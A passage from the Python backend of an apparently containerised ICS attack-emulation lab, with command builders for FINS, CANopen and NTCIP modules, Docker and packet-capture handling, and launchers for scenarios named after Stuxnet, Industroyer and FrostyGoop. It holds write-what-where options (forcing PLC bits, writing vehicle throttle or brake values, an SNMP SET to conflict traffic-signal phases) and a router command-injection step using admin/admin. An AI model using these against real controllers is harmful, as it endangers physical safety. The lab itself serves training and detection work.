    "force_cancel": {"label": "force_cancel - release all forced bits", "fields": []},
}


def build_fins_cmd(module, opts, ip, port, mode, interval, duration):
    """Validate an OMRON FINS module request and return the fins_console.py argv."""
    if module not in FINS_MODULES:
        raise ValueError("unknown module")
    cmd = [PYTHON, FINS_CONSOLE, "-m", module, "-t", ip, "-p", str(port),
           "--mode", mode, "--interval", str(interval), "--duration", str(duration)]
    if module in ("read", "write", "fill", "transfer"):
        area = str(opts.get("area", "DM"))
        if area not in _FINS_AREAS:
            raise ValueError("area invalid")
        cmd += ["--area", area, "--address", str(_mb_int(opts, "address", 0, 0xFFFF, 0))]
    if module == "read":
        dec = str(opts.get("decode", "word"))
        if dec not in ("word", "hex", "float"):
            raise ValueError("decode invalid")
        cmd += ["--count", str(_mb_int(opts, "count", 1, 256, 6)), "--decode", dec]
    elif module == "write":
        try:
            ws = [int(x) for x in str(opts.get("values", "")).split(",") if x.strip() != ""]
        except ValueError:
            raise ValueError("values must be comma ints")
        if not ws or any(not 0 <= w <= 0xFFFF for w in ws):
            raise ValueError("words 0..65535")
        cmd += ["--values", ",".join(str(w) for w in ws)]
    elif module == "fill":
        cmd += ["--count", str(_mb_int(opts, "count", 1, 256, 4)),
                "--fill-value", str(_mb_int(opts, "fill_value", 0, 0xFFFF, 0))]
    elif module == "transfer":
        da = str(opts.get("dst_area", "DM"))
        if da not in _FINS_AREAS:
            raise ValueError("dst area invalid")
        cmd += ["--count", str(_mb_int(opts, "count", 1, 256, 2)),
                "--dst-area", da, "--dst-address", str(_mb_int(opts, "dst_address", 0, 0xFFFF, 0))]
    elif module == "run":
        rm = str(opts.get("run_mode", "monitor"))
        if rm not in ("monitor", "run"):
            raise ValueError("run mode invalid")
        cmd += ["--run-mode", rm]
    elif module == "force":
        area = str(opts.get("area", "CIO"))
        if area not in ("CIO", "WR", "HR", "AR"):
            raise ValueError("force area must be CIO/WR/HR/AR")
        st = str(opts.get("force_state", "set"))
        if st not in ("set", "reset"):
            raise ValueError("force state invalid")
        cmd += ["--area", area, "--address", str(_mb_int(opts, "address", 0, 0xFFFF, 0)),
                "--bit", str(_mb_int(opts, "bit", 0, 15, 0)), "--force-state", st]
    return cmd


# ── CANopen (CAN over TCP) module menu ───────────────────────────────────────
# CAN is a bus, tunnelled over TCP by the vehicle gateway sim. Write-what-where =
# SDO-write a value into an object-dictionary entry (throttle/brake). Driven by
# common/canopen_console.py (raw CAN-over-TCP framing, no library).
CANOPEN_CONSOLE = os.path.join(SIM_DIR, "common", "canopen_console.py")
_CANOPEN_NODE = {"name": "node", "label": "Node", "type": "int", "default": 1}
CANOPEN_MODULES = {
    "sdo_read": {"label": "sdo_read - read an object dictionary entry",
                 "fields": [dict(_CANOPEN_NODE),
                            {"name": "index", "label": "Index", "type": "text", "default": "0x2002",
                             "help": "0x2000 throttle, 0x2001 brake, 0x2002 speed, 0x2003 accel"},
                            {"name": "subindex", "label": "Subindex", "type": "int", "default": 0}]},
    "sdo_write": {"label": "sdo_write - write a value to an OD entry (write what where)",
                  "fields": [dict(_CANOPEN_NODE),
                             {"name": "index", "label": "Index", "type": "text", "default": "0x2000",
                              "help": "0x2000 throttle, 0x2001 brake"},
                             {"name": "subindex", "label": "Subindex", "type": "int", "default": 0},
                             {"name": "value", "label": "Value", "type": "int", "default": 100},
                             {"name": "size", "label": "Size", "type": "select", "default": "1",
                              "options": ["1", "2", "4"]}]},
    "nmt": {"label": "nmt - network management (start/stop/reset a node)",
            "fields": [dict(_CANOPEN_NODE),
                       {"name": "nmt_cmd", "label": "Command", "type": "select", "default": "start",
                        "options": ["start", "stop", "preop", "reset", "reset_comm"]}]},
    "monitor": {"label": "monitor - read TPDO / heartbeat frames", "fields": [dict(_CANOPEN_NODE)]},
    "send_frame": {"label": "send_frame - send a raw CAN frame (COB-ID + data)",
                   "fields": [{"name": "cob_id", "label": "COB-ID", "type": "text", "default": "0x201"},
                              {"name": "data", "label": "Data (hex)", "type": "text", "default": "6400"}]},
}


def _canopen_hex(s):
    s = str(s).strip()
    try:
        int(s, 16) if s.lower().startswith("0x") else int(s)
    except ValueError:
        raise ValueError("index / COB-ID must be an int or 0xHEX")
    return s


def build_canopen_cmd(module, opts, ip, port, mode, interval, duration):
    """Validate a CANopen module request and return the canopen_console.py argv."""
    if module not in CANOPEN_MODULES:
        raise ValueError("unknown module")
    cmd = [PYTHON, CANOPEN_CONSOLE, "-m", module, "-t", ip, "-p", str(port),
           "--node", str(_mb_int(opts, "node", 1, 127, 1)),
           "--mode", mode, "--interval", str(interval), "--duration", str(duration)]
    if module in ("sdo_read", "sdo_write"):
        cmd += ["--index", _canopen_hex(opts.get("index", "0x2000")),
                "--subindex", str(_mb_int(opts, "subindex", 0, 255, 0))]
        if module == "sdo_write":
            size = str(opts.get("size", "1"))
            if size not in ("1", "2", "4"):
                raise ValueError("size must be 1 / 2 / 4")
            cmd += ["--value", str(_mb_int(opts, "value", 0, 0xFFFFFFFF, 0)), "--size", size]
    elif module == "nmt":
        nc = str(opts.get("nmt_cmd", "start"))
        if nc not in ("start", "stop", "preop", "reset", "reset_comm"):
            raise ValueError("nmt command invalid")
        cmd += ["--nmt-cmd", nc]
    elif module == "send_frame":
        data = str(opts.get("data", "")).strip().replace("0x", "").replace(" ", "")
        if len(data) > 16 or len(data) % 2 or any(c not in "0123456789abcdefABCDEF" for c in data):
            raise ValueError("data must be up to 8 bytes of hex")
        cmd += ["--cob-id", _canopen_hex(opts.get("cob_id", "0x201")), "--data", data]
    return cmd


# NTCIP (traffic signals / transportation) rides on SNMP; write-what-where = SNMP SET
# an NTCIP object. Backed by common/ntcip_console.py (raw SNMP v1/v2c, no library).
NTCIP_CONSOLE = os.path.join(SIM_DIR, "common", "ntcip_console.py")
_NTCIP_COMM = {"name": "community", "label": "Community", "type": "text", "default": "public"}
NTCIP_MODULES = {
    "ntcip_phases": {"label": "ntcip_phases - read + decode the signal phase status",
                     "fields": [dict(_NTCIP_COMM)]},
    "snmp_get": {"label": "snmp_get - GET an OID (recon)",
                 "fields": [dict(_NTCIP_COMM),
                            {"name": "oid", "label": "OID", "type": "text", "default": "1.3.6.1.2.1.1.1.0",
                             "help": "sysDescr 1.3.6.1.2.1.1.1.0; NTCIP objects under 1.3.6.1.4.1.1206"}]},
    "snmp_walk": {"label": "snmp_walk - GETNEXT-walk a subtree (enumerate)",
                  "fields": [dict(_NTCIP_COMM),
                             {"name": "oid", "label": "Root OID", "type": "text", "default": "1.3.6.1.4.1.1206"}]},
    "snmp_set": {"label": "snmp_set - SET an OID (write what where)",
                 "fields": [dict(_NTCIP_COMM),
                            {"name": "oid", "label": "OID", "type": "text",
                             "default": "1.3.6.1.4.1.1206.4.2.1.1.5.1.4.1",
                             "help": "phaseControlGroupHold - SET 0x0A (hex) to conflict the rings"},
                            {"name": "type", "label": "Type", "type": "select", "default": "hex",
                             "options": ["int", "str", "hex"]},
                            {"name": "value", "label": "Value", "type": "text", "default": "0A"}]},
}


def _ntcip_oid(s):
    s = str(s).strip()
    if not s or ".." in s or any(c not in "0123456789." for c in s):
        raise ValueError("OID must be dotted-decimal (e.g. 1.3.6.1.2.1.1.1.0)")
    return s


def build_ntcip_cmd(module, opts, ip, port, mode, interval, duration):
    """Validate an NTCIP/SNMP module request and return the ntcip_console.py argv."""
    if module not in NTCIP_MODULES:
        raise ValueError("unknown module")
    community = (str(opts.get("community", "public")).strip() or "public")
    cmd = [PYTHON, NTCIP_CONSOLE, "-m", module, "-t", ip, "-p", str(port),
           "--community", community, "--mode", mode,
           "--interval", str(interval), "--duration", str(duration)]
    if module in ("snmp_get", "snmp_walk"):
        cmd += ["--oid", _ntcip_oid(opts.get("oid", "1.3.6.1.2.1.1.1.0"))]
    elif module == "snmp_set":
        vtype = str(opts.get("type", "int"))
        if vtype not in ("int", "str", "hex"):
            raise ValueError("type must be int / str / hex")
        cmd += ["--oid", _ntcip_oid(opts.get("oid", "1.3.6.1.4.1.1206.4.2.1.1.5.1.4.1")),
                "--type", vtype, "--value", str(opts.get("value", "0"))]
    return cmd


# Protocol -> (module registry, argv builder). Adding a configurable protocol is a
# one-line entry here + a *_MODULES dict + a build_*_cmd function.
CONSOLE_BUILDERS = {
    "modbus": (MODBUS_MODULES, build_modbus_cmd),
    "iec104": (IEC104_MODULES, build_iec104_cmd),
    "s7": (S7_MODULES, build_s7_cmd),
    "opcua": (OPCUA_MODULES, build_opcua_cmd),
    "dnp3": (DNP3_MODULES, build_dnp3_cmd),
    "bacnet": (BACNET_MODULES, build_bacnet_cmd),
    "mbus": (MBUS_MODULES, build_mbus_cmd),
    "iec61850": (IEC61850_MODULES, build_iec61850_cmd),
    "fins": (FINS_MODULES, build_fins_cmd),
    "canopen": (CANOPEN_MODULES, build_canopen_cmd),
    "ntcip": (NTCIP_MODULES, build_ntcip_cmd),
}
# Per-protocol label for the fallback "run the canned scenario" module entry.
SCENARIO_LABEL = {
    "modbus": "FrostyGoop scenario (full canned attack)",
    "iec104": "Industroyer direct-attack scenario",
    "s7": "Stuxnet scenario (full canned attack)",
    "opcua": "PIPEDREAM gas-pipeline scenario",
    "dnp3": "Industroyer DNP3 scenario",
    "bacnet": "BACnet HVAC attack scenario",
    "mbus": "Fuxnet M-Bus attack scenario",
    "iec61850": "Industroyer/CrashOverride GOOSE scenario",
    "fins": "PIPEDREAM BadOmen FINS scenario",
    "canopen": "Monitor the CAN bus (TPDO/heartbeat)",
    "ntcip": "Read the traffic signal phase status",
}




# ── Target registry / profile management ─────────────────────────────────────
PROFILES = ["esxi", "docker", "local"]
TARGETS_FILE = TargetRegistry.default_overrides_path()
# Resolved at import by _autostart() (after the docker helpers are defined).
CURRENT_PROFILE = "esxi"
# Targets surfaced in the UI editor (skip the internal `legacy` alias).
_EDITABLE = ["water", "power", "gas", "centrifuge", "hvac", "boiler", "heating",
             "dnp3", "sensors", "sis", "historian", "iconics", "hmi", "router"]
# esxi-only hosts (Windows HMI / historian / iconics) that have no container in the
# docker lab. Hidden from the docker Targets view; the esxi profile still shows them.
_NO_DOCKER_CONTAINER = {"hmi", "historian", "iconics"}


COMPOSE_FILE = os.path.join(_REPO_ROOT, "docker", "docker-compose.yml")

_ESXI_CACHE = {"ts": 0.0, "val": False}


def _docker_available():
    import shutil
    return bool(shutil.which("docker")) and os.path.exists(COMPOSE_FILE)


def _esxi_available():
    """True if the ESXi OT lab looks reachable (a quick probe of a known PLC).
    Cached ~20s so the status poll stays snappy. Used to gray out the esxi
    profile in the UI when the VM lab isn't present."""
    import socket
    import time as _t
    if _t.time() - _ESXI_CACHE["ts"] < 20:
        return _ESXI_CACHE["val"]
    ok = False
    for host, port in (("192.168.1.10", 2404), ("192.168.1.6", 2404)):
        try:
            with socket.create_connection((host, port), timeout=0.6):
                ok = True
                break
        except OSError:
            continue
    _ESXI_CACHE.update(ts=_t.time(), val=ok)
    return ok


def _container_ip(service_host):
    """otlab bridge IP of the container for a compose service hostname.

    The docker bridge IP is routable from the host on Linux, so attacks
    launched from this (host) process can reach the containers on their native
    protocol ports. Compose names containers docker-<service>-1.
    """
    try:
        out = subprocess.run(
            ["docker", "inspect", "-f",
             "{{.NetworkSettings.Networks.otlab.IPAddress}}", f"docker-{service_host}-1"],
            capture_output=True, text=True, timeout=8)
        return out.stdout.strip() or None
    except Exception:
        return None


def ensure_lab_up():
    """Start the containerized OT lab (idempotent). Returns True if compose ran."""
    if not _docker_available():
        return False
    try:
        subprocess.run(["docker", "compose", "-f", COMPOSE_FILE, "up", "-d"],
                       capture_output=True, text=True, timeout=240)
        return True
    except Exception:
        return False


# The OT lab's own services (everything else docker may report is ignored).
LAB_SERVICES = ["plc-water", "plc-power", "plc-gas", "plc-centrifuge", "plc-hvac",
                "plc-boiler", "plc-heating", "plc-dnp3", "plc-sensors", "plc-vehicle",
                "plc-signals", "sis", "router", "fuxa"]
HMI_PORT = 1881   # FUXA operator SCADA / HMI (published to the host)
# Loading the operator-HMI views into FUXA: the seed script + the URL the console
# reaches FUXA on (otlab service hostname; override with MRHOTSHOT_FUXA_URL).
FUXA_SEED_SCRIPT = os.path.join(_REPO_ROOT, "scripts", "seed_fuxa_hmi.py")
FUXA_SEED_URL = os.environ.get("MRHOTSHOT_FUXA_URL", "http://fuxa:1881")

# PLC process services to (re)initialize on reset. Restarting a container re-runs
# water_tank_server.py, re-initializing that process to its __init__ setpoints
# (server/plant.py). Excludes router/fuxa/caldera (not process sims).
PLC_SERVICES = ["plc-water", "plc-power", "plc-gas", "plc-centrifuge", "plc-hvac",
                "plc-boiler", "plc-heating", "plc-dnp3", "plc-sensors", "plc-vehicle",
                "plc-signals", "sis"]


def _service_for_plc(plc):
    """Compose service name for a registry PLC key (sis has no plc- prefix)."""
    return "sis" if plc == "sis" else "plc-" + plc


def _docker_restart(services, log=lambda *_: None, wait_ready=0):
    """docker compose restart the given services (re-inits their process). Optionally
    sleep wait_ready seconds afterwards so the sim + protocol server can re-bind."""
    proc = subprocess.Popen(
        ["docker", "compose", "-f", COMPOSE_FILE, "restart"] + list(services),
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in proc.stdout:
        log(line.rstrip())
    rc = proc.wait(timeout=120)
    if wait_ready:
        time.sleep(wait_ready)
    return rc


def lab_status():
    """Map of our compose service -> running? (empty when docker is unavailable)."""
    if not _docker_available():
        return {}
    try:
        out = subprocess.run(
            ["docker", "compose", "-f", COMPOSE_FILE, "ps", "--format", "{{.Service}} {{.State}}"],
            capture_output=True, text=True, timeout=10)
        seen = {}
        for line in out.stdout.splitlines():
            parts = line.split()
            if len(parts) >= 2:
                seen[parts[0]] = parts[1] == "running"
        # Report only our known lab services so a stray container can't skew the count.
        return {svc: seen.get(svc, False) for svc in LAB_SERVICES}
    except Exception:
        return {}


# ── Live process registry (for Stop) + packet capture (tshark) ───────────────
PROCS = {}        # attack_id -> Popen of the running payload (for /stop)
CAPTURES = {}     # attack_id -> Popen of the running tshark
STOPPED = set()   # attack_ids the operator pressed Stop on (abort between phases)
CAPTURE_DIR = os.path.join(DEMO_DIR, "captures")
os.makedirs(CAPTURE_DIR, exist_ok=True)
PCAP_MAX_KB = int(os.environ.get("MRHOTSHOT_PCAP_MAX_MB", "250")) * 1024   # per-capture autostop (tshark -a filesize is in KB)
# tshark/dumpcap drops privileges, so the pcap output dir must be world-writable
# (it's a bind-mounted host dir under the console container). Non-sensitive.
try:
    os.chmod(CAPTURE_DIR, 0o777)
except OSError:
    pass

# ── OT detection sensor (Suricata) output - live alerts (eve.json) ───────────
# Written by the separate opt-in sensor container (docker/sensor.yml) and shared
# with the dashboard through this bind-mounted dir. World-writable for the same
# reason as CAPTURE_DIR (the sensor writes as root). Absent until `make sensor-up`.
DETECT_DIR = os.path.join(DEMO_DIR, "detections")
EVE_PATH = os.path.join(DETECT_DIR, "eve.json")
FAST_PATH = os.path.join(DETECT_DIR, "fast.log")
SENSOR_CONTAINER = "mrhotshot-sensor"
RULES_FILE = os.path.join(_REPO_ROOT, "docker", "suricata", "rules", "ot.rules")
os.makedirs(DETECT_DIR, exist_ok=True)
try:
    os.chmod(DETECT_DIR, 0o777)
except OSError:
    pass

# protocol-name substring -> ports, used to build a tshark capture filter.
_PROTO_PORTS = {
    "modbus": [502], "iec-104": [2404], "iec 104": [2404], "iec-61850": [8102],
    "goose": [8102], "mms": [102], "tristation": [1502], "s7": [102],
    "opc-ua": [4840], "opcua": [4840], "bacnet": [47808], "dnp3": [20000],
    "m-bus": [5000], "mbus": [5000], "fins": [9600], "dcom": [135],
    "mssql": [1433], "http": [8080], "ssh": [22],
    # Protocols whose free-text names above matched nothing, so their filter came out
    # empty and tshark captured every packet on the interface (or, for cosmicenergy,
    # captured only the IT stage and missed the OT payload entirely).
    "iec 60870": [2404], "canopen": [20001], "ntcip": [161], "snmp": [161],
    "modicon": [27127],
}


def _tshark_bin():
    import shutil
    return shutil.which("tshark")


def _capture_iface():
    """Interface to sniff. Inside the console container (the attacker) we capture
    all of its own interfaces with 'any' - it can't see the host's otlab bridge,
    but since the attacks originate here, 'any' captures the attacker<->PLC
    traffic. On the host: the otlab bridge (docker) or loopback (local)."""
    if os.path.exists("/.dockerenv"):
        return "any"
    if CURRENT_PROFILE == "docker":
        nid = subprocess.run(["docker", "network", "inspect", "-f", "{{.Id}}", "otlab"],
                             capture_output=True, text=True).stdout.strip()
        return f"br-{nid[:12]}" if nid else None
    if CURRENT_PROFILE == "local":
        return "lo"
    return None


def _capture_filter(a):
    proto = (a.get("protocol") or "").lower()
    ports = {p for key, pl in _PROTO_PORTS.items() if key in proto for p in pl}
    # A steps scenario states its ports outright, so it never depends on the
    # free-text protocol name matching a _PROTO_PORTS key.
    for step in a.get("steps") or []:
        try:
            ports.add(int(step.get("port") or CUSTOM_PROTOCOLS[step["protocol"]][1]))
        except (KeyError, TypeError, ValueError):
            pass
    # Attacks with a router initial-access phase also generate HTTP/SSH traffic to
    # the router - include those ports so the pcap spans the full kill chain.
    if a.get("initial_access") == "router":
        ports |= {8080, 22}
    ports = sorted(ports)
    return " or ".join(f"port {p}" for p in ports)   # "" => capture all on iface


STEP_TOTAL_MAX = 600      # same ceiling /custom clamps a single run to


def _step_argvs(a, plc=None):
    """A scenario's `steps:` -> one argv per step, all built and validated BEFORE
    the first one runs.

    Each step is a Custom-Target operation, so it goes through the very same
    build_<proto>_cmd validator that POST /custom uses. A scenario declaring
    steps can therefore express nothing the Custom Target tab cannot already
    express by hand, and a bad option raises here rather than half way through a
    run - a partially-applied scenario is worse than a rejected one.

    Target hosts resolve at LAUNCH time, not load time, because launch() may
    rebuild the catalog and rebind the target map mid-run under docker.
    """
    plc = PLC if plc is None else plc
    argvs, total = [], 0
    for i, step in enumerate(a.get("steps") or [], 1):
        where = f"{a.get('id', '?')} step {i}"
        proto = str(step.get("protocol", "")).strip().lower()
        if proto not in CUSTOM_PROTOCOLS:
            raise ValueError(f"{where}: unknown protocol {proto!r}")
        reg = CONSOLE_BUILDERS.get(proto)
        module = str(step.get("module", "")).strip()
        if not reg or module not in reg[0]:
            raise ValueError(f"{where}: unknown module {module!r} for {proto}")

        host = step.get("host") or plc.get(step.get("plc", ""), "")
        if not host:
            # Name the valid targets: this error is read by the copilot, which
            # cannot correct an unknown plc name it is not shown alternatives to.
            raise ValueError(f"{where}: unknown plc {step.get('plc')!r} "
                             f"(known: {', '.join(sorted(plc))})")
        if len(host) > 255 or not all(c.isalnum() or c in ".-_" for c in host):
            raise ValueError(f"{where}: invalid target host {host!r}")

        try:
            port = int(step.get("port") or CUSTOM_PROTOCOLS[proto][1])
            duration = max(1, min(STEP_TOTAL_MAX, int(step.get("duration") or 15)))
            interval = max(0.2, min(60.0, float(step.get("interval") or 5)))
        except (TypeError, ValueError):
            raise ValueError(f"{where}: invalid port/duration/interval") from None
        if not 1 <= port <= 65535:
            raise ValueError(f"{where}: invalid port {port}")

        total += duration
        if total > STEP_TOTAL_MAX:
            raise ValueError(f"{where}: total step duration exceeds {STEP_TOTAL_MAX}s")

        mode = "repeat" if str(step.get("mode", "once")).lower() == "repeat" else "once"
        argvs.append((reg[1](module, step.get("options") or {}, host, port,
                             mode, interval, duration),
                      f"{proto}/{module} -> {host}:{port}", duration))
    return argvs


def _kill_proc(proc):
    """Terminate a process and its group (started with start_new_session=True)."""
    if not proc:
        return
    import signal
    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
    except Exception:
        try:
            proc.kill()
        except Exception:
            pass


def _start_capture(attack_id, a, ts, log):
    tshark = _tshark_bin()
    if not tshark:
        log("[CAPTURE] tshark not installed - skipping. Enable with: "
            "sudo apt-get install -y tshark")
        return None
    iface = _capture_iface()
    if not iface:
        log(f"[CAPTURE] no capture interface for the '{CURRENT_PROFILE}' profile "
            "- use the docker or local profile to capture.")
        return None
    pcap = os.path.join(CAPTURE_DIR, f"{attack_id}_{ts}.pcap")
    flt = _capture_filter(a)
    # -p: no promiscuous mode (required for the 'any' device inside the container)
    # -a filesize -> autostop so a long capture can't fill the disk / serve a giant pcap
    # (default 250 MB; set MRHOTSHOT_PCAP_MAX_MB to change). tshark filesize is in KB.
    cmd = [tshark, "-i", iface, "-p", "-w", pcap, "-q", "-a", "filesize:%d" % PCAP_MAX_KB] + (["-f", flt] if flt else [])
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE,
                                text=True, start_new_session=True)
        CAPTURES[attack_id] = (proc, pcap)
        time.sleep(1.0)                       # let the capture initialize before traffic
        if proc.poll() is not None:
            err = (proc.stderr.read() or "").strip().splitlines()[-1:] or [""]
            log(f"[CAPTURE] tshark could not start ({err[0]}). Grant capture rights once: "
                "sudo dpkg-reconfigure wireshark-common && sudo usermod -aG wireshark $USER")
            CAPTURES.pop(attack_id, None)
            return None
        log(f"[CAPTURE] tshark on {iface}  filter='{flt or 'all'}'  -> {os.path.basename(pcap)}")
        return pcap
    except Exception as e:
        log(f"[CAPTURE] error: {e}")
        return None


def _stop_capture(attack_id, log):
    item = CAPTURES.pop(attack_id, None)
    if not item:
        return
    proc, pcap = item
    _kill_proc(proc)
    try:
        proc.wait(timeout=5)
    except Exception:
        pass
    if pcap and os.path.exists(pcap) and os.path.getsize(pcap) > 24:
        name = os.path.basename(pcap)
        log(f"[CAPTURE] saved {name} ({os.path.getsize(pcap)} bytes) - download: /download/{name}")
    else:
        log("[CAPTURE] no packets captured (filter matched nothing, or the link was idle).")


def _registry():
    return TargetRegistry(profile=CURRENT_PROFILE)


def _resolved_plc():
    """name -> address for the active profile. Under `docker`, swap service
    hostnames for the live container IPs (host-reachable); other profiles use
    the registry value as-is."""
    pm = _registry().plc_map()
    if CURRENT_PROFILE != "docker":
        return pm
    resolved = {}
    for name, host in pm.items():
        resolved[name] = _container_ip(host) or host
    return resolved


def _rebuild_catalog():
    """Re-resolve PLC for the active profile and rebuild the attack catalog."""
    global PLC, ATTACKS
    PLC = _resolved_plc()
    ATTACKS = load_scenarios(PLC)
    _init_state()


def _autostart():
    """Pick the active profile at boot and prepare it.

    With no explicit choice (env MRHOTSHOT_PROFILE / targets.yaml), prefer the
    containerized lab when Docker is available - it's the path that actually
    works locally - instead of esxi, which needs the external VM lab. Then
    start the lab and resolve targets to live container IPs.
    """
    global CURRENT_PROFILE
    reg = TargetRegistry()
    explicit = os.environ.get("MRHOTSHOT_PROFILE") or reg._overrides.get("profile")
    CURRENT_PROFILE = explicit or ("docker" if _docker_available() else "esxi")
    if CURRENT_PROFILE == "docker":
        ensure_lab_up()
    _rebuild_catalog()


_autostart()


def _targets_state():
    reg = _registry()
    resolved = _resolved_plc()   # under docker these are live container IPs
    names = ([n for n in _EDITABLE if n not in _NO_DOCKER_CONTAINER]
             if CURRENT_PROFILE == "docker" else _EDITABLE)
    out = []
    for name in names:
        t = reg.get(name)
        out.append({"name": name, "process": t.protocols and name,
                    "ip": resolved.get(name, t.ip),
                    "protocols": t.protocols, "creds": t.creds})
    return out


def _load_yaml():
    import yaml
    if os.path.exists(TARGETS_FILE):
        with open(TARGETS_FILE) as fh:
            return yaml.safe_load(fh) or {}
    return {}


def _save_yaml(data):
    import yaml
    os.makedirs(os.path.dirname(TARGETS_FILE), exist_ok=True)
    with open(TARGETS_FILE, "w") as fh:
        yaml.safe_dump(data, fh, sort_keys=False, default_flow_style=False)


def _visible_attacks():
    """Catalog for the active profile. esxi-only attacks (whose target host has no
    container, e.g. the MSSQL/OPC-DA historians) are hidden under docker/local."""
    lab = CURRENT_PROFILE in ("docker", "local")
    return [a for a in ATTACKS if not (lab and a.get("esxi_only"))]


@app.route("/")
def index():
    visible = _visible_attacks()
    attacks_json = json.dumps([
        {k: v for k, v in a.items() if not k.startswith("cmd")}
        for a in visible
    ])
    return render_template("index.html", attacks=visible, attacks_json=attacks_json,
                           noviz=list(wp.no_viz()),
                           profile=CURRENT_PROFILE, profiles=PROFILES)


@app.route("/api/targets")
def api_targets():
    lab = lab_status()
    return jsonify({"profile": CURRENT_PROFILE, "profiles": PROFILES,
                    "reachable": {"esxi": _esxi_available(),
                                  "docker": _docker_available(), "local": True},
                    "targets": _targets_state(),
                    "hmi": {"port": HMI_PORT, "up": bool(lab.get("fuxa"))},
                    "lab": {"available": _docker_available(),
                            "up": bool(lab) and all(lab.values()),
                            "services": lab}})


@app.route("/api/seed-fuxa", methods=["POST"])
def api_seed_fuxa():
    """Load (or reload) the operator-HMI views into FUXA - runs seed_fuxa_hmi.py
    --force against the running FUXA. Needed once after a fresh lab (or `down -v`)
    to populate the heating + substation views."""
    if not os.path.exists(FUXA_SEED_SCRIPT):
        return jsonify({"status": "error", "msg": "seed script not found"}), 404
    try:
        r = subprocess.run([PYTHON, FUXA_SEED_SCRIPT, "--force", "--url", FUXA_SEED_URL],
                           capture_output=True, text=True, timeout=60)
        out = (r.stdout + r.stderr).strip()
        ok = r.returncode == 0
        last = out.splitlines()[-1] if out else ("seeded" if ok else "failed")
        return jsonify({"status": "ok" if ok else "error", "msg": last, "log": out[-2000:]})
    except subprocess.TimeoutExpired:
        return jsonify({"status": "error", "msg": "seed timed out"}), 504
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)[:200]}), 500


@app.route("/api/targets", methods=["POST"])
def api_save_target():
    body = request.get_json(force=True) or {}
    name = body.get("name")
    if name not in _EDITABLE:
        return jsonify({"status": "error", "msg": "unknown target"}), 400
    data = _load_yaml()
    targets = data.setdefault("targets", {})
    entry = targets.setdefault(name, {})
    if body.get("ip"):
        entry["ip"] = body["ip"].strip()
    if isinstance(body.get("protocols"), dict):
        entry.setdefault("protocols", {}).update(
            {k: int(v) for k, v in body["protocols"].items()})
    if isinstance(body.get("creds"), dict):
        entry.setdefault("creds", {}).update(body["creds"])
    _save_yaml(data)
    _rebuild_catalog()
    return jsonify({"status": "ok", "targets": _targets_state()})


@app.route("/api/profile", methods=["POST"])
def api_set_profile():
    global CURRENT_PROFILE
    body = request.get_json(force=True) or {}
    profile = (body.get("profile") or "").strip().lower()
    if profile not in PROFILES:
        return jsonify({"status": "error", "msg": "unknown profile"}), 400
    CURRENT_PROFILE = profile
    os.environ["MRHOTSHOT_PROFILE"] = profile      # children inherit it
    data = _load_yaml()
    data["profile"] = profile                       # persist for restarts
    _save_yaml(data)
    # Selecting docker means "run against the container lab": bring it up, then
    # resolve targets to the live container IPs.
    lab_started = ensure_lab_up() if profile == "docker" else False
    _rebuild_catalog()
    return jsonify({"status": "ok", "profile": profile, "lab_started": lab_started,
                    "targets": _targets_state()})


def _run_router_phase(attack_id, a, log):
    """Docker Phase 0: RCE the internet-facing router, then pivot to the OT side.
    Brand-neutral emulation of the FrostyGoop-reported initial-access chain: an
    unauthenticated command-injection exploit is delivered to the router's
    diagnostic web API, yielding a root shell from which the attacker reaches the
    OT controller. The router is a live container at its own IP that answers the
    requests, so the capture shows real request/response traffic to a distinct host."""
    router_ip = PLC["router"]
    script = os.path.join(ATTACKER_SCRIPTS, "01_router_exploit.py")
    log("=" * 60)
    log("[PHASE 0] INITIAL ACCESS - internet-facing router RCE")
    log(f"  Target: router {router_ip}:8080  (a different host than the OT controller)")
    log("  Vector: unauthenticated command injection on the diagnostic web API")
    log("=" * 60)
    if not os.path.exists(script):
        log("[PHASE 0] router exploit script missing - skipping to OT payload")
        log("")
        return
    try:
        proc = subprocess.Popen(
            [PYTHON, script, router_ip, "-p", "8080", "-u", "admin", "-P", "admin",
             "--command", "id && hostname && echo '[pivot] reaching OT controller from router'"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
            cwd=ATTACKER_SCRIPTS, start_new_session=True,
        )
        PROCS[attack_id] = proc
        for line in proc.stdout:
            log(line.rstrip())
        proc.wait(timeout=40)
        log("")
        log("[PHASE 0] Router compromised (root shell) - foothold on the OT-facing side")
        log("[PHASE 0] Pivoting from the router to the OT controller ...")
        log("")
    except Exception as e:
        log(f"[PHASE 0] router phase note: {e} - continuing to the OT payload")
        log("")
    finally:
        PROCS.pop(attack_id, None)


@app.route("/launch/<attack_id>", methods=["POST"])
def launch(attack_id):
    a = next((x for x in ATTACKS if x["id"] == attack_id), None)
    if not a:
        return jsonify({"status": "error", "msg": "unknown attack"})
    if a.get("esxi_only") and CURRENT_PROFILE in ("docker", "local"):
        return jsonify({"status": "error",
                        "msg": f"{a['name']} needs the ESXi VM lab (no container target); "
                               "switch to the esxi profile."}), 400
    with _STATE_LOCK:                        # atomic check-then-set: no double-start race
        if running.get(attack_id):
            return jsonify({"status": "already_running"})
        running[attack_id] = True
        logs[attack_id] = []
        STOPPED.discard(attack_id)           # clear any stale Stop request from a prior run

    body = request.get_json(silent=True) or {}
    want_capture = bool(body.get("capture"))
    want_warmup = bool(body.get("warmup"))   # dashboard Launch: start sim, run 10s, then attack

    def run():
        nonlocal a
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        logfile = os.path.join(LOG_DIR, f"{attack_id}_{ts}.log")
        _prune_log_dir()
        def _log(line):
            _log_append(attack_id, line)
            with open(logfile, "a") as f:
                f.write(line + "\n")

        try:
            _log(f"[LOG] Attack: {attack_id}  Started: {datetime.now().isoformat()}")
            _log(f"[LOG] Logfile: {logfile}")
            _log("")

            # Container/local profiles attack the PLC directly (no Windows HMI to
            # pivot through). The docker profile auto-starts the lab and retargets
            # to the live container IPs.
            lab_profile = CURRENT_PROFILE in ("docker", "local")
            if CURRENT_PROFILE == "docker":
                _log("[LAB] docker profile - ensuring the container lab is up ...")
                ensure_lab_up()
                _rebuild_catalog()
                a = next((x for x in ATTACKS if x["id"] == attack_id), a)
                _log(f"[LAB] target resolved to {a['target']}")
                _log("")

            # ── Warmup: start the target simulation, let it run normally, then attack.
            #    (dashboard Launch does this so there is a clear before/after; the Visualizer
